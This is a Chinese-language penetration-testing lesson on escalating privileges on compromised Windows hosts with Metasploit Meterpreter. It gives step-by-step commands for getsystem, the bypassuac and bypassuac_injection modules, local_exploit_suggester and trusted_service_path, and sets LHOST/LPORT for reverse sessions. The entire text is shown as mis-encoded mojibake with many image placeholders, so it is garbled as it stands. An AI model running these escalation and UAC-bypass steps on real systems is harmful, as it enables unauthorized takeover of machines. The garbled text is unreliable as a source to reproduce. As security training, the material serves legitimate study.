# è¯¾ç¨‹P70ï¼šç¬¬39å¤© - æƒé™æå‡ï¼šMeterpreterææƒæ¨¡å—è¯¦è§£ ğŸ”“

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•åœ¨Metasploitæ¡†æ¶ï¼ˆMSFï¼‰ä¸­åˆ©ç”¨Meterpreterçš„ææƒæ¨¡å—ï¼Œå°†æ™®é€šç”¨æˆ·æƒé™æå‡è‡³SYSTEMæˆ–ç®¡ç†å‘˜æƒé™ã€‚è¯¾ç¨‹å†…å®¹æ¶µç›–è‡ªåŠ¨ææƒå‘½ä»¤ã€ç»•è¿‡ç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼ˆUACï¼‰ä»¥åŠåˆ©ç”¨æœ¬åœ°ææƒæ¼æ´é›†åˆæ¨¡å—ã€‚

---

![](img/1c282b348d9e2063f3ceead4e0d8de6d_1.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_3.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_5.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_7.png)

## æ¦‚è¿° ğŸ“‹

æœ¬èŠ‚è¯¾ä¸»è¦ä»‹ç»MSFåŠCobalt Strikeï¼ˆCSï¼‰æ¡†æ¶ä¸‹ææƒæ¨¡å—çš„ä½¿ç”¨ã€‚ä¸ŠèŠ‚è¯¾æˆ‘ä»¬ä»‹ç»äº†Windowsç³»ç»Ÿä¸‹çš„ææƒæ–¹æ³•ä¸æŠ€å·§ï¼Œæœ¬èŠ‚è¯¾å°†åœ¨æ­¤åŸºç¡€ä¸Šï¼Œé‡ç‚¹æ¼”ç¤ºMSFä¸­å¯¹åº”çš„ã€å¯ç›´æ¥åˆ©ç”¨çš„ææƒæ¨¡å—ã€‚

è¯¾ç¨‹ä¸»è¦å†…å®¹åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š
1.  MSFä¸­Meterpreterææƒæ¨¡å—çš„ä½¿ç”¨ã€‚
2.  Cobalt Strikeæ¡†æ¶ä¸­ææƒæ¨¡å—çš„ä»‹ç»ä¸æ“ä½œã€‚

åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œè·å¾—ä¸€ä¸ªShellåï¼Œæˆ‘ä»¬å¸¸å°†å…¶åå¼¹è‡³MSFæˆ–CSè¿™ç±»æ¡†æ¶ä¸­ï¼Œä»¥ä¾¿åˆ©ç”¨å…¶é›†æˆçš„åŠŸèƒ½æ¨¡å—ï¼Œæ›´é«˜æ•ˆåœ°è¿›è¡Œåç»­æµ‹è¯•å’Œæƒé™æå‡ã€‚

---

## Meterpreterè‡ªåŠ¨ææƒå‘½ä»¤

![](img/1c282b348d9e2063f3ceead4e0d8de6d_9.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_11.png)

é¦–å…ˆï¼Œæˆ‘ä»¬ä»‹ç»Meterpreterä¸­æœ€å¸¸è§çš„è‡ªåŠ¨ææƒå‘½ä»¤ï¼š`getsystem`ã€‚

è¿™ä¸ªå‘½ä»¤ç”¨äºå°è¯•å°†å½“å‰ä¼šè¯æƒé™æå‡è‡³SYSTEMçº§åˆ«ã€‚å…¶ä½¿ç”¨å‰ææ˜¯å½“å‰ç”¨æˆ·å±äºç®¡ç†å‘˜ç»„ï¼Œä½†å³ä½¿æ»¡è¶³æ­¤æ¡ä»¶ï¼Œææƒä¹Ÿä¸ä¸€å®šæ€»èƒ½æˆåŠŸã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_13.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_15.png)

ä»¥ä¸‹æ˜¯ä¸¤ç§å…¸å‹æƒ…å†µï¼š

![](img/1c282b348d9e2063f3ceead4e0d8de6d_17.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_19.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_21.png)

**æƒ…å†µä¸€ï¼šç›´æ¥ææƒæˆåŠŸ**
å½“æ‰§è¡Œ `getsystem` å‘½ä»¤åï¼Œè‹¥è¿”å›æ–°çš„ä¼šè¯ï¼ˆä¾‹å¦‚session 2ï¼‰ï¼Œå¹¶ä¸”é€šè¿‡ `getuid` å‘½ä»¤æŸ¥çœ‹æ˜¾ç¤ºä¸º `NT AUTHORITY\SYSTEM`ï¼Œåˆ™è¡¨æ˜ææƒæˆåŠŸã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_23.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_24.png)

**æƒ…å†µäºŒï¼šç›´æ¥ææƒå¤±è´¥**
æ›´å¸¸è§çš„æƒ…å†µæ˜¯ï¼Œæ‰§è¡Œ `getsystem` å‘½ä»¤åä¼šæŠ¥é”™ï¼Œæç¤ºæ“ä½œå¤±è´¥ï¼ˆ`Operation failed: The environment is incorrect.`ï¼‰ã€‚è¿™æ„å‘³ç€æ— æ³•é€šè¿‡æ­¤å‘½ä»¤ç›´æ¥å®Œæˆææƒã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_26.png)

é’ˆå¯¹ç¬¬äºŒç§å¤±è´¥æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦é‡‡ç”¨å…¶ä»–æ–¹æ³•ï¼Œä¾‹å¦‚ç»•è¿‡ç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼ˆUACï¼‰ã€‚

---

## ç»•è¿‡ç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼ˆUACï¼‰

![](img/1c282b348d9e2063f3ceead4e0d8de6d_28.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_30.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_32.png)

ç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼ˆUACï¼‰æ˜¯å¾®è½¯çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæ—¨åœ¨ç¼“è§£æ¶æ„è½¯ä»¶çš„å½±å“ã€‚å½“æ™®é€šç”¨æˆ·å°è¯•æ‰§è¡Œéœ€è¦ç®¡ç†å‘˜æƒé™çš„æ“ä½œï¼ˆå¦‚è¿è¡Œ`regedit`æˆ–ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ`cmd`ï¼‰æ—¶ï¼Œç³»ç»Ÿä¼šå¼¹å‡ºç¡®è®¤çª—å£ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_33.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_35.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_36.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_37.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_38.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_40.png)

ç»•è¿‡UACçš„æ ¸å¿ƒæ€è·¯æ˜¯ï¼šåˆ©ç”¨æ¼æ´æˆ–ç‰¹å®šæ–¹æ³•ï¼Œåœ¨ä¸è§¦å‘UACå¼¹çª—æˆ–æ¬ºéª—å…¶æœºåˆ¶çš„æƒ…å†µä¸‹ï¼Œä½¿æ™®é€šç”¨æˆ·è·å¾—ç®¡ç†å‘˜æƒé™ã€‚

åœ¨MSFä¸­ï¼Œé›†æˆäº†å¤šä¸ªç”¨äºç»•è¿‡UACçš„æ¨¡å—ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ `search bypassuac` å‘½ä»¤è¿›è¡Œæœç´¢å’ŒæŸ¥çœ‹ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_42.png)

### BypassUACæ¨¡å—ä½¿ç”¨

![](img/1c282b348d9e2063f3ceead4e0d8de6d_44.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_45.png)

å½“ç›´æ¥ä½¿ç”¨ `getsystem` ææƒå¤±è´¥æ—¶ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ `exploit/windows/local/bypassuac` æ¨¡å—ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_47.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_49.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_50.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_51.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_52.png)

ä»¥ä¸‹æ˜¯ä½¿ç”¨æ­¥éª¤ï¼š
1.  åœ¨è·å¾—ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™çš„Meterpreterä¼šè¯ï¼ˆä¾‹å¦‚session 1ï¼‰åï¼ŒèƒŒæ™¯åŒ–è¯¥ä¼šè¯ï¼ˆ`background`ï¼‰ã€‚
2.  ä½¿ç”¨ `use exploit/windows/local/bypassuac` å‘½ä»¤åŠ è½½æ¨¡å—ã€‚
3.  è®¾ç½®å¿…éœ€çš„å‚æ•°ï¼š
    *   `set SESSION <ä¼šè¯ID>`ï¼šæŒ‡å®šå·²æœ‰çš„æ™®é€šç”¨æˆ·ä¼šè¯ã€‚
    *   `set LHOST <ç›‘å¬IP>`ï¼šè®¾ç½®å›è¿åœ°å€ã€‚
    *   `set LPORT <ç›‘å¬ç«¯å£>`ï¼šè®¾ç½®å›è¿ç«¯å£ã€‚
4.  æ‰§è¡Œ `exploit` å‘½ä»¤ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_53.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_54.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_55.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_56.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_57.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_59.png)

æ¨¡å—è¿è¡ŒæˆåŠŸåï¼Œä¼šå»ºç«‹ä¸€ä¸ªæ–°çš„Meterpreterä¼šè¯ï¼ˆä¾‹å¦‚session 2ï¼‰ã€‚è¿›å…¥è¿™ä¸ªæ–°ä¼šè¯åï¼Œå†æ‰§è¡Œ `getsystem` å‘½ä»¤ï¼Œé€šå¸¸å°±èƒ½æˆåŠŸè·å¾—SYSTEMæƒé™ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_60.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_61.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_63.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_65.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_66.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_67.png)

**æ ¸å¿ƒåŸç†**ï¼šBypassUACæ¨¡å—åˆ©ç”¨æ¼æ´ï¼Œä½¿å½“å‰ä¼šè¯è·å¾—äº†â€œç»•è¿‡UACéªŒè¯â€åçš„ç®¡ç†å‘˜ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå†æ‰§è¡Œ `getsystem`ï¼ŒæˆåŠŸç‡å¤§å¤§æå‡ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_69.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_70.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_72.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_73.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_75.png)

### BypassUACæ³¨å…¥æ¨¡å—

![](img/1c282b348d9e2063f3ceead4e0d8de6d_77.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_79.png)

å¦ä¸€ä¸ªç±»ä¼¼çš„æ¨¡å—æ˜¯ `exploit/windows/local/bypassuac_injection`ã€‚å…¶ä½¿ç”¨æ–¹å¼ä¸ä¸Šè¿°æ¨¡å—å®Œå…¨ç›¸åŒï¼š
1.  `use exploit/windows/local/bypassuac_injection`
2.  `set SESSION <å·²æœ‰ä¼šè¯ID>`
3.  `set LHOST <ç›‘å¬IP>`
4.  `exploit`

![](img/1c282b348d9e2063f3ceead4e0d8de6d_81.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_83.png)

è¯¥æ¨¡å—è¿è¡Œåï¼Œå¯èƒ½ä¼šç›´æ¥è¿”å›ä¸€ä¸ªå…·æœ‰SYSTEMæƒé™çš„æ–°ä¼šè¯ã€‚

**æ³¨æ„**ï¼šåœ¨ä½¿ç”¨è¿™äº›æ¨¡å—æ—¶ï¼ŒåŠ¡å¿…æ³¨æ„`TARGET`å‚æ•°çš„è®¾ç½®ã€‚å¦‚æœç›®æ ‡ç³»ç»Ÿæ˜¯64ä½ï¼ˆx64ï¼‰ï¼Œè€Œæ¨¡å—é»˜è®¤æˆ–è®¾ç½®çš„`TARGET`æ˜¯32ä½ï¼ˆx86ï¼‰ï¼Œåˆ™ä¼šå¯¼è‡´å¤±è´¥ã€‚é”™è¯¯ä¿¡æ¯é€šå¸¸ä¸ºï¼š`[-] Exploit aborted due to failure: bad-config: x86 target selected for x64 system`ã€‚æ­¤æ—¶ï¼Œéœ€è¦ä½¿ç”¨ `show targets` æŸ¥çœ‹å¯ç”¨ç›®æ ‡ï¼Œå¹¶ç”¨ `set TARGET <ç›®æ ‡ID>` å‘½ä»¤è¿›è¡Œæ­£ç¡®è®¾ç½®ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_85.png)

---

![](img/1c282b348d9e2063f3ceead4e0d8de6d_87.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_88.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_90.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_92.png)

## æœ¬åœ°ææƒæ¼æ´åˆ©ç”¨å»ºè®®å™¨

![](img/1c282b348d9e2063f3ceead4e0d8de6d_94.png)

ä¸Šä¸€èŠ‚è¯¾æˆ‘ä»¬ä»‹ç»äº†Windowså¹³å°çš„å„ç§ææƒæ¼æ´ã€‚åœ¨MSFä¸­ï¼Œæœ‰ä¸€ä¸ªéå¸¸å®ç”¨çš„æ¨¡å— `post/multi/recon/local_exploit_suggester`ï¼Œå¯ä»¥è‡ªåŠ¨æ£€æµ‹ç›®æ ‡ç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„æœ¬åœ°ææƒæ¼æ´ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_96.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_98.png)

è¯¥æ¨¡å—åŸºäºå·²æœ‰çš„ä¼šè¯ï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œæ£€æµ‹è„šæœ¬ï¼Œå¹¶åˆ—å‡ºMSFä¸­å¯ä¾›å°è¯•åˆ©ç”¨çš„å¯¹åº”æ¼æ´æ¨¡å—ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_100.png)

ä½¿ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š
1.  åœ¨è·å¾—ä¸€ä¸ªä¼šè¯åï¼ŒèƒŒæ™¯åŒ–è¯¥ä¼šè¯ã€‚
2.  ä½¿ç”¨ `use post/multi/recon/local_exploit_suggester` å‘½ä»¤åŠ è½½æ¨¡å—ã€‚
3.  è®¾ç½®å‚æ•°ï¼š`set SESSION <å·²æœ‰ä¼šè¯ID>`ã€‚
4.  æ‰§è¡Œ `exploit` æˆ– `run` å‘½ä»¤ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_102.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_104.png)

æ¨¡å—è¿è¡Œåï¼Œä¼šè¾“å‡ºä¸€ä¸ªå»ºè®®åˆ©ç”¨çš„æ¨¡å—åˆ—è¡¨ã€‚ä¾‹å¦‚ï¼š
```
[+] 10.10.10.15 - exploit/windows/local/ms10_092_schelevator
[+] 10.10.10.15 - exploit/windows/local/ms16_014_wmi_recv_notif
```
æˆ‘ä»¬å¯ä»¥é€‰æ‹©å…¶ä¸­ä¸€ä¸ªæ¨¡å—è¿›è¡Œå°è¯•ï¼š
1.  `use <æ¨èçš„æ¨¡å—è·¯å¾„>`
2.  `set SESSION <åŒä¸€ä¸ªå·²æœ‰ä¼šè¯ID>`
3.  ï¼ˆæ ¹æ®éœ€è¦è®¾ç½®å…¶ä»–å‚æ•°ï¼Œå¦‚LHOSTï¼‰
4.  `exploit`

å¦‚æœåˆ©ç”¨æˆåŠŸï¼Œå°†ä¼šè·å¾—ä¸€ä¸ªæ–°çš„ã€æƒé™æ›´é«˜çš„ä¼šè¯ï¼ˆå¯èƒ½æ˜¯ç®¡ç†å‘˜æˆ–SYSTEMæƒé™ï¼‰ã€‚ä¹‹åå¯ä»¥åœ¨æ­¤æ–°ä¼šè¯ä¸­å°è¯•æ‰§è¡Œ `getsystem` ä»¥ç¡®è®¤æˆ–è¿›ä¸€æ­¥æå‡æƒé™ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_106.png)

**é‡è¦æç¤º**ï¼šæ­¤æ¨¡å—ç»™å‡ºçš„å»ºè®®ä»…ä½œä¸ºå‚è€ƒï¼Œå¹¶éæ‰€æœ‰åˆ—å‡ºçš„æ¨¡å—éƒ½èƒ½ä¿è¯ææƒæˆåŠŸã€‚æ¸—é€æµ‹è¯•éœ€è¦ä¸æ–­å°è¯•ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_108.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_110.png)

---

![](img/1c282b348d9e2063f3ceead4e0d8de6d_111.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_113.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_115.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_117.png)

## ä¸å®‰å…¨çš„æœåŠ¡è·¯å¾„æ¼æ´åˆ©ç”¨

ä¸ŠèŠ‚è¯¾æˆ‘ä»¬ä»‹ç»äº†WindowsæœåŠ¡æ¼æ´ä¸­çš„â€œä¸å®‰å…¨çš„æœåŠ¡è·¯å¾„â€ï¼ˆUnquoted Service Pathï¼‰ã€‚åœ¨MSFä¸­ï¼Œæœ‰å¯¹åº”çš„æ¨¡å— `exploit/windows/local/trusted_service_path` æ¥åˆ©ç”¨æ­¤ç±»æ¼æ´ã€‚

è¯¥æ¨¡å—ä¼šè‡ªåŠ¨åœ¨ç›®æ ‡æœºå™¨ä¸Šæœç´¢å­˜åœ¨â€œå¯å†™å…¥è·¯å¾„â€ä¸”æœåŠ¡è·¯å¾„æœªç”¨å¼•å·æ‹¬èµ·çš„æœåŠ¡ï¼Œå¹¶å°è¯•åˆ©ç”¨ã€‚

ä½¿ç”¨æ–¹æ³•ä¸å…¶ä»–æœ¬åœ°æ¼æ´åˆ©ç”¨æ¨¡å—ç±»ä¼¼ï¼š
1.  `use exploit/windows/local/trusted_service_path`
2.  `set SESSION <å·²æœ‰ä¼šè¯ID>`
3.  `set LHOST <ç›‘å¬IP>`
4.  `exploit`

æ¨¡å—è¿è¡Œåï¼Œä¼šå°è¯•æŸ¥æ‰¾å¹¶åˆ©ç”¨ç¬¦åˆæ¡ä»¶çš„æœåŠ¡ã€‚å¦‚æœæ‰¾åˆ°å¹¶åˆ©ç”¨æˆåŠŸï¼Œå³å¯è·å¾—ä¸€ä¸ªSYSTEMæƒé™çš„ä¼šè¯ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_119.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_121.png)

---

![](img/1c282b348d9e2063f3ceead4e0d8de6d_123.png)

## æ€»ç»“ ğŸ¯

![](img/1c282b348d9e2063f3ceead4e0d8de6d_125.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_127.png)

æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†MSFæ¡†æ¶ä¸­Meterpreterçš„å¤šç§æƒé™æå‡æ–¹æ³•ï¼š

![](img/1c282b348d9e2063f3ceead4e0d8de6d_129.png)

![](img/1c282b348d9e2063f3ceead4e0d8de6d_130.png)

1.  **åŸºç¡€å‘½ä»¤**ï¼šé¦–å…ˆå°è¯•ä½¿ç”¨ `getsystem` å‘½ä»¤è¿›è¡Œè‡ªåŠ¨ææƒã€‚
2.  **ç»•è¿‡UAC**ï¼šå½“ `getsystem` å¤±è´¥æ—¶ï¼Œä½¿ç”¨ `bypassuac` æˆ– `bypassuac_injection` æ¨¡å—ç»•è¿‡ç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼Œä¸ºåç»­ææƒåˆ›é€ æ¡ä»¶ã€‚
3.  **æ¼æ´åˆ©ç”¨**ï¼š
    *   ä½¿ç”¨ `local_exploit_suggester` æ¨¡å—æ™ºèƒ½æ¨èæœ¬åœ°ææƒæ¼æ´åˆ©ç”¨æ¨¡å—ã€‚
    *   ä½¿ç”¨ `trusted_service_path` æ¨¡å—ä¸“é—¨åˆ©ç”¨â€œä¸å®‰å…¨çš„æœåŠ¡è·¯å¾„â€æ¼æ´ã€‚

![](img/1c282b348d9e2063f3ceead4e0d8de6d_132.png)

è¿™äº›æ¨¡å—å¤§å¤§ç®€åŒ–äº†æ‰‹åŠ¨ä¿¡æ¯æ”¶é›†å’Œåˆ©ç”¨æ¼æ´çš„æµç¨‹ã€‚å…³é”®åœ¨äºè·å¾—ä¸€ä¸ªåˆå§‹ä¼šè¯ï¼ˆå³ä½¿æƒé™å¾ˆä½ï¼‰ï¼Œç„¶åæ ¹æ®ç›®æ ‡ç³»ç»Ÿç¯å¢ƒï¼Œçµæ´»é€‰ç”¨å’Œå°è¯•ä¸Šè¿°æ¨¡å—ã€‚åŒæ—¶ï¼ŒåŠ¡å¿…æ³¨æ„æ¨¡å—å‚æ•°ï¼ˆå¦‚`SESSION`, `LHOST`, `TARGET`ï¼‰çš„æ­£ç¡®é…ç½®ï¼Œå¹¶ç†è§£æ“ä½œå¤±è´¥æ—¶çš„æŠ¥é”™ä¿¡æ¯ï¼Œè¿™æ˜¯è§£å†³é—®é¢˜çš„å…³é”®ã€‚